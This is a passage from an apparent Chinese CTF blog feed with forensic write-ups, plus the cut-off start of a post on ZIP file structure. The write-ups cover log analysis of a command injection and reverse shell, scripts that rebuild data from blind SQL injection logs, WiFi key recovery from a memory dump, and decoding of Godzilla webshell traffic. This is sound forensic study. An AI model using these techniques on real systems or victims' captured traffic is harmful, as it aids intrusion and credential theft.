class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>CTF<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>HUAWEI P40_2021-aa-bb xx.yy.zz.exeDataSectionObject 0x7d8c7d10   None   <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>CTF<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>HUAWEI P40_2021-aa-bb xx.yy.zz.exe</code></pre><p>于是把华为备份文件dump出来，同时可以直接在dat文件里把备份文件夹解压出来，再利用工具 <a href="https://github.com/RealityNet/kobackupdec">kobackupdec</a></p><pre class="language-python" data-language="python"><code class="language-python">python3 kobackupdec<span class="token punctuation">.</span>py <span class="token operator">-</span>vvv W31C0M3_T0_THiS_34SY_F0R3NSiCX HUAWEI\ P40_2021<span class="token operator">-</span>aa<span class="token operator">-</span>bb\ xx<span class="token punctuation">.</span>yy<span class="token punctuation">.</span>zz <span class="token punctuation">.</span><span class="token operator">/</span>bb</code></pre><p>即可获取flag<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210923152921.png" alt="20210923152921"></p><h2 id="07简单的日志分析"><a href="#07简单的日志分析" class="headerlink" title="07简单的日志分析"></a>07简单的日志分析</h2><blockquote><p>某应用程序被攻击，请分析日志后作答</p></blockquote><h3 id="7-1-题目内容"><a href="#7-1-题目内容" class="headerlink" title="7.1 题目内容"></a>7.1 题目内容</h3><p>黑客攻击的参数是___ <code>whoami</code>___。（如有字母请全部使用小写）<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210923155214.png" alt="20210923155214"></p><h3 id="7-2-题目内容"><a href="#7-2-题目内容" class="headerlink" title="7.2 题目内容"></a>7.2 题目内容</h3><p>黑客查看的秘密文件的绝对路径是______ <code>/Th4s_IS_VERY_Import_Fi1e</code>_______。<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210923155120.png" alt="20210923155120"></p><h3 id="7-3-题目内容"><a href="#7-3-题目内容" class="headerlink" title="7.3 题目内容"></a>7.3 题目内容</h3><p>黑客反弹shell的ip和端口是____ <code>192.168.2.197:8888</code>_________。（格式使用“ip:端口”，例如127.0.0.1:2333）<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210923155338.png" alt="20210923155338"></p><h2 id="08SQL注入"><a href="#08SQL注入" class="headerlink" title="08SQL注入"></a>08SQL注入</h2><h3 id="8-1-题目内容"><a href="#8-1-题目内容" class="headerlink" title="8.1 题目内容"></a>8.1 题目内容</h3><p>黑客在注入过程中采用的注入手法叫______ <code>布尔盲注</code>_______。（格式为4个汉字，例如“拼搏努力”）</p><h3 id="8-2-题目内容"><a href="#8-2-题目内容" class="headerlink" title="8.2 题目内容"></a>8.2 题目内容</h3><p>黑客在注入过程中，最终获取flag的数据库名、表名和字段名是_____ <code>sqli#flag#flag</code>________。（格式为“数据库名#表名#字段名”，例如database#table#column）</p><p>直接看最后注flag就能获取</p><h3 id="8-3-题目内容"><a href="#8-3-题目内容" class="headerlink" title="8.3 题目内容"></a>8.3 题目内容</h3><p>黑客最后获取到的flag字符串为_____ <code>flag&#123;deddcd67-bcfd-487e-b940-1217e668c7db&#125;</code>________。</p><h4 id="解题过程-4"><a href="#解题过程-4" class="headerlink" title="解题过程"></a>解题过程</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    s <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment">#print s[i][108]</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">108</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">108</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">108</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">116</span><span class="token punctuation">]</span>                <span class="token keyword">print</span> flag        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">108</span><span class="token punctuation">:</span><span class="token number">110</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">9</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">108</span><span class="token punctuation">:</span><span class="token number">110</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">108</span><span class="token punctuation">:</span><span class="token number">110</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span>                <span class="token keyword">print</span> flag    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">print</span> flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token comment">#flag&#123;dedcd67-bcfd-487e-b940-1217e668c7db&#125;</span></code></pre><h2 id="09-wifi"><a href="#09-wifi" class="headerlink" title="09 wifi"></a>09 wifi</h2><blockquote><p>网管小王最近喜欢上了ctf网络安全竞赛，他使用“哥斯拉”木马来玩玩upload-labs，并且保存了内存镜像、wifi流量和服务器流量，让您来分析后作答：（本题仅1小问)</p></blockquote><h3 id="题目内容-1"><a href="#题目内容-1" class="headerlink" title="题目内容"></a>题目内容</h3><p>小王往upload-labs上传木马后进行了cat &#x2F;flag，flag内容为_____ <code>flag&#123;5db5b7b0bb74babb66e1522f3a6b1b12&#125;</code>________。（压缩包里有解压密码的提示，需要额外添加花括号）</p><h4 id="解题过程-5"><a href="#解题过程-5" class="headerlink" title="解题过程"></a>解题过程</h4><p>分析 <code>服务端.pcapng</code>获取1.php<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210923170651.png" alt="20210923170651"></p><p>打开 <code>客户端.cap</code>发现是加密的Wi-Fi包<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210923170911.png" alt="20210923170911"></p><p>对内存进行分析（看桌面，看admin，意外发现Mywifi.zip）<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/iShot2021-09-24%2009.30.52.png" alt="iShot2021-09-24 09.30.52"><br>这里就需要一个前置知识了</p><blockquote><p>网卡的 GUID 和接口绑定是绑定的，win7的wifi密码就存放在c:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces[网卡Guid]中</p></blockquote><p>如果不知道这里，其实也可以使用命令：</p><pre class="language-cmd" data-language="cmd"><code class="language-cmd">getmac &#x2F;V &#x2F;S 127.0.0.1 </code></pre><p>然后再everything搜索一下<br>因此这里直接搜索Interface<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/iShot2021-09-24%2009.30.34.png" alt="iShot2021-09-24 09.30.34"></p><p>解压之后回去xml，里面存在wifi的信息</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>WLANProfile</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.microsoft.com/networking/WLAN/profile/v1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>My_Wifi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SSIDConfig</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SSID</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hex</span><span class="token punctuation">></span></span>4D795F57696669<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>hex</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>My_Wifi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>SSID</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>SSIDConfig</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>connectionType</span><span class="token punctuation">></span></span>ESS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>connectionType</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>connectionMode</span><span class="token punctuation">></span></span>auto<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>connectionMode</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>MSM</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>security</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>authEncryption</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>authentication</span><span class="token punctuation">></span></span>WPA2PSK<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>authentication</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>encryption</span><span class="token punctuation">></span></span>AES<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>encryption</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>useOneX</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>useOneX</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>authEncryption</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sharedKey</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>keyType</span><span class="token punctuation">></span></span>passPhrase<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>keyType</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>protected</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>protected</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>keyMaterial</span><span class="token punctuation">></span></span>233@114514_qwe<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>keyMaterial</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sharedKey</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>security</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>MSM</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>WLANProfile</span><span class="token punctuation">></span></span></code></pre><p>因此可以解密wifi流量<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210924103208.png" alt="20210924103208"></p><p>这里也可以使用如下命令</p><pre class="language-bash" data-language="bash"><code class="language-bash">airdecap-ng <span class="token parameter variable">-e</span> My_Wifi <span class="token parameter variable">-p</span> <span class="token number">233</span>@114514_qwe  客户端.cap</code></pre><p>解密后可以获取加密返回的信息,到这里基础信息收集完毕了，剩下的就是解密流量了，参考文章：</p><ul><li><a href="https://www.freebuf.com/sectool/285693.html">https://www.freebuf.com/sectool/285693.html</a></li><li><a href="https://blog.csdn.net/zeros__/article/details/111521314">https://blog.csdn.net/zeros__/article/details/111521314</a></li></ul><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210924114920.png" alt="20210924114920"><br>根据上面的文章可以知道（对于PHP_XOR_BASE64加密方式来说，前后各附加了16位的混淆字符），所以我们拿到的流量要先删除前16位和后16位字符，同时Godzilla的流量还会进行一个gzip压缩，因此最外层还要用gzdecode进行一次解码。<br>最终解密1198号数据包的时候获取flag</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210924103539.png" alt="20210924103539"></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">encode</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">,</span><span class="token variable">$K</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$K</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$c</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token variable">$D</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token variable">$pass</span><span class="token operator">=</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">;</span><span class="token variable">$payloadName</span><span class="token operator">=</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">;</span><span class="token variable">$key</span><span class="token operator">=</span><span class="token string single-quoted-string">'3c6e0b8a9c15224a'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">gzdecode</span><span class="token punctuation">(</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fL1tMGI4YTljMn75e3jOBS5/V31Qd1NxKQMCe3h4KwFQfVAEVworCi0FfgB+BlWZhjRlQuTIIB5jMTU='</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>在<a href="https://www.dooccn.com/php5.4/">5.x的环境</a>中运行获取flag <code>flag&#123;5db5b7b0bb74babb66e1522f3a6b1b12&#125;</code></p><p>最后提供一个非常大神的<a href="https://mp.weixin.qq.com/s/PUb1qkybBz3ATsKmsEuIJQ">解决方案</a>，自己用同样的木马连接一下，然后改返回包就行了<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210924114705.png" alt="20210924114705"></p><h2 id="10-ios"><a href="#10-ios" class="headerlink" title="10 ios"></a>10 ios</h2><p>一位ios的安全研究员在家中使用手机联网被黑，不仅被窃密还丢失比特币若干，请你通过流量和日志分析后作答</p><h3 id="10-1-题目内容"><a href="#10-1-题目内容" class="headerlink" title="10.1 题目内容"></a>10.1 题目内容</h3><p>黑客所控制的C&amp;C服务器IP是______ <code>3.128.156.159</code>_______。<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210924115854.png" alt="20210924115854"></p><h3 id="10-2-题目内容"><a href="#10-2-题目内容" class="headerlink" title="10.2 题目内容"></a>10.2 题目内容</h3><p>黑客利用的Github开源项目的名字是__ <code>stowaway</code>____。（如有字母请全部使用小写)<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210924134819.png" alt="20210924134819"></p><h3 id="10-3-题目内容"><a href="#10-3-题目内容" class="headerlink" title="10.3 题目内容"></a>10.3 题目内容</h3><p>通讯加密密钥的明文是_____ <code>hack4sec</code>_______。<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210924140128.png" alt="20210924140128"></p><h3 id="10-4-题目内容"><a href="#10-4-题目内容" class="headerlink" title="10.4 题目内容"></a>10.4 题目内容</h3><p>黑客通过SQL盲注拿到了一个敏感数据，内容是_____ <code>flag&#123;746558f3-c841-456b-85d7-d6c0f2edabb2&#125;</code>_______。</p><h4 id="解题过程-6"><a href="#解题过程-6" class="headerlink" title="解题过程"></a>解题过程</h4><p>首先把TLS流量解密<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210924140929.png" alt="20210924140929"><br>按照协议进行排序，发现盲注的流量出现了http2的协议部分<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210924141447.png" alt="20210924141447"></p><p>导出数据为csv格式<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210924163926.png" alt="20210924163926"><br>筛选出sql注入的流量<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210924164038.png" alt="20210924164038"><br>url解码并使用awk处理一下数据</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">awk</span> <span class="token string">'&#123;print $2,$3&#125;'</span> sql.txt <span class="token operator">></span>sql1.txt</code></pre><p>最终脚本获取flag</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'sql1.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    s <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">55</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">9</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">55</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">55</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">73</span><span class="token punctuation">:</span><span class="token number">75</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>                <span class="token keyword">print</span> flag        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">55</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">9</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">55</span><span class="token punctuation">:</span><span class="token number">57</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">55</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">73</span><span class="token punctuation">:</span><span class="token number">75</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>                <span class="token keyword">print</span> flag    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">55</span><span class="token punctuation">:</span><span class="token number">57</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">9</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">55</span><span class="token punctuation">:</span><span class="token number">57</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">55</span><span class="token punctuation">:</span><span class="token number">57</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">74</span><span class="token punctuation">:</span><span class="token number">76</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>                <span class="token keyword">print</span> flag    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">print</span> flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span></code></pre><h3 id="10-5-题目内容"><a href="#10-5-题目内容" class="headerlink" title="10.5 题目内容"></a>10.5 题目内容</h3><p>黑客端口扫描的扫描器的扫描范围是_____ <code>10-499</code>_______。（格式使用“开始端口-结束端口”，例如1-65535）</p><h4 id="解题过程-7"><a href="#解题过程-7" class="headerlink" title="解题过程"></a>解题过程</h4><p>找红色的，然后筛选一下获取端口扫描范围<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210924170843.png" alt="20210924170843"></p><h3 id="10-6-题目内容"><a href="#10-6-题目内容" class="headerlink" title="10.6 题目内容"></a>10.6 题目内容</h3><p>被害者手机上被拿走了的私钥文件内容是____________。</p><h3 id="10-7-题目内容"><a href="#10-7-题目内容" class="headerlink" title="10.7 题目内容"></a>10.7 题目内容</h3><p>黑客访问&#x2F;攻击了内网的几个服务器，IP地址为____ <code>172.28.0.2#192.168.1.12</code>________。（多个IP之间按从小到大排序，使用#来分隔，例如127.0.0.1#192.168.0.1)</p><h4 id="解题过程-8"><a href="#解题过程-8" class="headerlink" title="解题过程"></a>解题过程</h4><ul><li>access.log发现被上传马的ip</li><li>流量里发现sql注入的ip</li></ul><h3 id="10-8-题目内容"><a href="#10-8-题目内容" class="headerlink" title="10.8 题目内容"></a>10.8 题目内容</h3><p>黑客写入了一个webshell，其密码为_____ <code>fxxk</code>_______。<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210924140216.png" alt="20210924140216"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ctf-Misc-压缩包总结</title>
      <link href="/ctf/wiki/ctf-misc-archive/"/>
      <url>/ctf/wiki/ctf-misc-archive/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文例题下载地址链接: <a href="https://pan.baidu.com/s/1ystdLRH9fcEkrZHtSDMu3Q">https://pan.baidu.com/s/1ystdLRH9fcEkrZHtSDMu3Q</a> 提取码: fia2 </p></blockquote><blockquote><p>提取码: fia2 </p></blockquote><h2 id="ZIP类"><a href="#ZIP类" class="headerlink" title="ZIP类"></a>ZIP类</h2><h3 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h3><p><code>ZIP</code> 文件主要由三部分构成，分别为</p><table><thead><tr><th>压缩源文件数据区</th><th>核心目录</th><th>目录结束</th></tr></thead><tbody><tr><td>local file header + file data + data descriptor</td><td>central directory</td><td>end of central directory record</td></tr></tbody></table><ul><li><p>压缩源文件数据区中每一个压缩的源文件或目录都是一条记录，其中</p><ul><li><code>local file header</code> ：文件头用于标识该文件的开始，记录了该压缩文件的信息，这里的文件头标识由固定值 <code>50 4B 03 04</code> 开头，也是 <code>ZIP</code> 的文件头的重要标志</li><li><code>file data</code> ：文件数据记录了相应压缩文件的数据</li><li><code>data descriptor</code> ：数据描述符用于标识该文件压缩结束，该结构只有在相应的 <code>local file header</code> 中通用标记字段的第 <code>3 bit</code> 设为 <code>1</code> 时才会出现，紧接在压缩文件源数据后</li></ul></li><li><p><code>Central directory</code> 核心目录</p><ul><li><p>记录了压缩文件的目录信息，在这个数据区中每一条纪录对应在压缩源文件数据区中的一条数据。</p><table><thead><tr><th>Offset</th><th>Bytes</th><th>Description</th><th>译</th></tr></thead><tbody><tr><td>0</td><td>4</td><td>Central directory file header signature &#x3D; 0x02014b50</td><td>核心目录文件 header标识 &#x3D;（0x02014b50）</td></tr><tr><td>4</td><td>2</td><td>Version made by</td><td>压缩所用的 pkware 版本</td></tr><tr><td>6</td><td>2</td><td>Version needed to extract (minimum)</td><td>解压所需 pkware 的最低版本</td></tr><tr><td>8</td><td>2</td><td>General purpose bit flag</td><td>通用位标记伪加密</td></tr><tr><td>10</td><td>2</td><td>Compression method</td><td>压缩方法</td></tr><tr><td>12</td><td>2</td><td>File last modification time</td><td>文件最后修改时间</td></tr><tr><td>14</td><td>2</td><td>File last modification date</td><td>文件最后修改日期</td></tr><tr><td>16</td><td>4</td><td>CRC-32</td><td>CRC-32 校验码</td></tr><tr><td>20</td><td>4</td><td>Compressed size</td><td>压缩后的大小</td></tr><tr><td>24</td><td>4</td><td>Uncompressed size</td><td>未压缩的大小</td></tr><tr><td>28</td><td>2</td><td>File name length 